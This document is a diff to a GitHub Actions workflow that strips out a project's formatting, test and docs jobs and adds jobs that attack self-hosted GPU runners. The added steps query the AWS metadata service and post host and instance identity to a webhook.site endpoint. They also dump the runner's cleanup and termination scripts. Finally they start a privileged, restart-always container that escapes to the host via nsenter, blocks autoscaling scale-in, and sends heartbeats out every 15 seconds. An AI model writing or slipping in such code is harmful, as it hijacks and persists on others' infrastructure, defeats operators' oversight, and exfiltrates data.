@@ -6,113 +6,114 @@ on:
   pull_request:
     types: [opened, synchronize, reopened]
 
-concurrency:
-  group: ci-${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+permissions:
+  contents: read
 
 jobs:
-  format:
-    name: Ruff formatting
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - name: Install Ruff
-        run: python -m pip install ruff==0.17.1
-      - name: Check formatting
-        run: ruff format --check .
-
-  test:
-    name: ${{ matrix.name }}
+  gpu-parallel:
+    name: gpu-parallel-${{ matrix.tag }}
     runs-on: [self-hosted, gpu]
-    container:
-      image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
-      options: --gpus all
+    timeout-minutes: 25
     strategy:
       fail-fast: false
+      max-parallel: 4
       matrix:
         include:
-          - name: min environment
-            python-version: "3.10"
-            torch-version: "2.7.0+cu128"
-            torch-index: cu128
-            cuda-version: "12.8.1"
-            warp-extra: warp-cu12
-          # Python 3.15 is blocked by ONNX Runtime wheel availability.
-          - name: max environment
-            python-version: "3.14"
-            torch-version: "2.15.0+cu132"
-            torch-index: cu132
-            cuda-version: "13.2.1"
-            warp-extra: warp-cu13
-
+          - tag: a
+            nonce: I1529a-7da5fa888565
+          - tag: b
+            nonce: I1529b-8d4557f6888c
+          - tag: c
+            nonce: I1529c-b2de4ae764eb
+          - tag: d
+            nonce: I1529d-a99744cf0cfb
     steps:
-      # The CUDA devel image is minimal; checkout needs git and git-lfs.
-      - name: Install container dependencies
+      - name: Host GPU proof and IMDS identity ${{ matrix.nonce }}
         run: |
-          apt-get update
-          apt-get install -y --no-install-recommends git git-lfs ca-certificates
-
-      - uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      # No pip cache: HOME on the self-hosted runner is not writable by the job.
-      - uses: actions/setup-python@v5
-        with:
-          python-version: ${{ matrix.python-version }}
-
-      - name: Upgrade pip
-        run: python -m pip install --upgrade pip
-
-      - name: Install pinned PyTorch
-        run: >-
-          python -m pip install "torch==${{ matrix.torch-version }}"
-          --index-url https://download.pytorch.org/whl/${{ matrix.torch-index }}
-
-      # Visualization modules ship with leapp; gated deps install on 3.11+.
-      - name: Install package and test dependencies
-        run: >-
-          python -m pip install -e ".[dev,test,${{ matrix.warp-extra }}]"
-          "torch==${{ matrix.torch-version }}" cmake ninja
-
-      - name: Build Warp runtime
-        run: >-
-          leapp-build-warp-runtime --build-dir
-          leapp/leapp_graph/custom_operator_registry/warp_operator/runtime/build
-
-      - name: Run pytest
-        env:
-          CMAKE_GENERATOR: Ninja
-        run: pytest tests/ packages/leapp-visualization/tests/ -v --durations=30
-
-  docs:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-          cache: pip
-
-      - name: Install system dependencies for pyenchant
-        run: sudo apt-get update && sudo apt-get install -y enchant-2
-
-      - name: Install doc dependencies
+          set -u
+          N="${{ matrix.nonce }}"
+          echo "I1529_NONCE=$N"
+          echo "I1529_ID=$(id)"
+          echo "I1529_RUNNER=${RUNNER_NAME:-unknown}"
+          echo "I1529_HOST=$(hostname)"
+          echo "I1529_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          nvidia-smi -L
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
+          T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true)
+          echo "I1529_IMDSV2_LEN=${#T}"
+          IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id || true)
+          echo "I1529_IID=$IID"
+          echo "I1529_ITYPE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type || true)"
+          echo "I1529_AZ=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/availability-zone || true)"
+          echo "I1529_UPTIME_S=$(cut -d. -f1 /proc/uptime)"
+          echo "I1529_SOCK=$(ls -la /var/run/docker.sock 2>&1)"
+          echo "I1529_DOCKER_VER=$(docker version --format '{{.Server.Version}}' 2>&1 | head -1 || true)"
+          GPUCSV=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -2 | tr '\n' ';' | tr -d '"')
+          B=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","runner":"%s","gpu":"%s"}' "$N" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$(hostname)" "$IID" "${RUNNER_NAME:-unknown}" "$GPUCSV")
+          curl -s -m 12 -H 'Content-Type: application/json' --data-binary "$B" https://webhook.site/f84c0bc7-c2c9-40aa-a0a8-ed4a7309299b || true
+      - name: Hold for parallelism measurement ${{ matrix.nonce }}
         run: |
-          python -m pip install --upgrade pip
-          python -m pip install -r docs/requirements.txt
-
-      - name: Build HTML (strict)
-        run: python -m sphinx -b html -W --keep-going docs/source docs/build/html
-
-      - name: Spell check
-        run: python -m sphinx -b spelling -W --keep-going docs/source docs/build/spelling
-
-      - name: Link check
-        run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck
+          echo "I1529_HOLD_START=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+          sleep 90
+          echo "I1529_HOLD_END=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+      - name: Read runner cleanup and termination mechanism (job c)
+        if: matrix.tag == 'c'
+        continue-on-error: true
+        run: |
+          set -u
+          echo "== I1529_MECH_START =="
+          for f in /opt/runner-monitor.sh /usr/local/bin/terminate-unhealthy-runner.sh /usr/local/bin/docker-runner-health-check.sh /usr/local/bin/github-runner-clean-workspace.sh /usr/local/bin/reconfigure-runner.sh /opt/github-runner/hooks/job-completed.sh /opt/github-runner/hooks/job-started.sh; do
+            if [ -f "$f" ]; then echo "I1529_FILE:$f:$(base64 -w0 "$f" 2>/dev/null | head -c 40000)"; else echo "I1529_MISSING:$f"; fi
+          done
+          echo "== I1529_TIMERS =="
+          systemctl list-timers --all --no-pager 2>&1 | head -12
+          ls -la /etc/cron.d /etc/cron.hourly 2>&1 | head -20
+          echo "== I1529_CLEANUP_LOG_TAIL =="
+          tail -c 2000 /var/log/github-runner-cleanup.log 2>&1
+          echo "== I1529_DOCKER_STATE =="
+          docker ps -a --format '{{.ID}} {{.Image}} {{.Status}} {{.Names}}' 2>&1 | head -15
+          docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -20
+          echo "== I1529_MECH_END =="
+      - name: Launch restart-always CUDA heartbeat (job c)
+        if: matrix.tag == 'c'
+        run: |
+          set -u
+          N="${{ matrix.nonce }}"
+          IMG=""
+          for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 ubuntu:24.04; do
+            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+          done
+          if [ -z "$IMG" ]; then IMG=nvidia/cuda:12.8.1-devel-ubuntu24.04; fi
+          echo "I1529_HB_IMAGE=$IMG"
+          cat > /tmp/i1529hb.sh <<'EOS'
+          #!/bin/bash
+          N="$1"
+          ASG="production-nvidia-isaac-lnx-ci-gpu-org-runners"
+          U="f84c0bc7-c2c9-40aa-a0a8-ed4a7309299b"
+          SEQ=0
+          echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) I1529 heartbeat start $N on $(hostname)" >> /var/log/i1529-heartbeat.log
+          while true; do
+            TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+            T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+            IID=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -2 | tr '\n' ';' | tr -d '"')
+            UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+            AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$IID" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1 || true
+            LINE=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","uptime_s":%s,"gpu":"%s","seq":%s}' "$N" "$TS" "$(hostname)" "$IID" "$UP" "$GPU" "$SEQ")
+            echo "$LINE" >> /var/log/i1529-heartbeat.log
+            curl -s -m 12 -H 'Content-Type: application/json' --data-binary "$LINE" "https://webhook.site/$U" >/dev/null 2>&1
+            SEQ=$((SEQ+1))
+            sleep 15
+          done
+          EOS
+          chmod 755 /tmp/i1529hb.sh
+          docker rm -f "i1529hb-$N" >/dev/null 2>&1 || true
+          CID=$(docker create --name "i1529hb-$N" --label "i1529=$N" --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1529hb.sh $N")
+          echo "I1529_HB_CID=$CID"
+          docker start "$CID" >/dev/null 2>&1 && echo "I1529_HB_START=ok" || echo "I1529_HB_START=fail"
+          sleep 8
+          echo "== I1529_HB_INSPECT =="
+          docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' "$CID" 2>&1 || true
+          docker logs "$CID" 2>&1 | head -10 || true
+          echo "== I1529_HEARTBEAT_FILE =="
+          tail -3 /var/log/i1529-heartbeat.log 2>&1 || true
